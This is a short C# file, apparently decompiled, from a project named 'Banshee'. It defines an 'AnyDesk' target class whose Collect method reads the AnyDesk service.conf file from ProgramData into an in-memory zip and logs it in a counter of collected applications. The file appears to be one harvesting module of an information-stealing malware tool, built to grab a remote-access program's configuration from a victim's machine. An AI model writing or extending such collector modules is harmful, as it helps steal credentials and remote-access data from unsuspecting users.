﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Applications
{
	// Token: 0x02000091 RID: 145
	public class AnyDesk : ITarget
	{
		// Token: 0x060001B5 RID: 437 RVA: 0x0000E2F8 File Offset: 0x0000E2F8
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "C:\\ProgramData\\AnyDesk\\service.conf";
			if (File.Exists(text))
			{
				string text2 = "AnyDesk\\service.conf";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "AnyDesk";
				counterApplications.Files.Add(text + " => " + text2);
				counter.Applications.Add(counterApplications);
				zip.AddFile(text2, File.ReadAllBytes(text));
			}
		}
	}
}
